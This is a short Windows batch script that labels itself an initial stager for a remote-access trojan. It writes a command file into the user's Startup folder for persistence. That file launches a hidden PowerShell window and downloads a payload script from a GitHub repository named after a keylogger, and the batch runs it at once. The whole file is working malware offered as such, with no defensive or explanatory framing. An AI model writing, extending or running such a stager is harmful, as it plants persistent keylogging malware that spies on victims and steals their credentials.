@echo off
@REM initial stager for RAT
@REM created by : R00TM4ST3R

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

@REM move into startup directory
cd %STARTUP%

@REM TODO : build out stage two
@REM write payloads to startup
(
    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/refs/heads/main/p.ps1 -Outfile p.ps1"
) > wget.cmd

@REM run payload
powershell ./wget.cmd
pause

@REM cd back into initial location
cd %INITIALPATH%
@REM del initial.cmd